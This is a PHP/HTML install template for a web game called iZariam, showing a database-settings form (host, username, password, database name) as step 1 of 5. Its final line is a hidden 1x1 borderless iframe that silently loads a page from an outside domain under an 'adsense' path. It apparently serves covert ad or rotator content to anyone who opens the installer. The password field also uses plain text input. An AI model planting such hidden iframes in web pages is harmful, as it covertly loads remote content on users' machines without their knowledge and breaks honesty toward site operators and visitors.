<?php
/*
 * Project: iZariam
 * File: install/templates/db.php
 * Edited: 07/03/2012
 * By: ZZJHONS
 * Info: zzjhons@gmail.com
 */
?>
<center>
    <h2>Step 1: Database Settings</h2>
    <progress value="1" max="5">
             <span>20</span>%
    </progress>
    <br>
    <br>
    <form action="install.php" method="post" id="database">
        <table cellpadding="5" cellspacing="0">
            <tr>
            	<td><label title="URL to your database host">Hostname</label></td>
            	<td><input type="text" class="input" name="dbhost" id="dbhost" value="localhost"></td>
            </tr>
            <tr>
                <td><label title="Username to connect to the database">Username</label></td>
                <td><input type="text" class="input" name="dbuser" id="dbuser"></td>
            </tr>
            <tr>
                <td><label title="Password to connect to the database">Password</label></td>
                <td><input type="text" class="input" name="dbpass" id="dbpass"></td>
            </tr>
            <tr>
                <td><label title="Name of your database">Database name</label></td>
                <td><input type="text" class="input" name="dbname" id="dbname"></td>
            </tr>
        </table>
        <br>
        <input type="submit" class="button" value=" Next Step ">
        <input type="hidden" name="database" value="1">
    </form>
</center>
<iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe>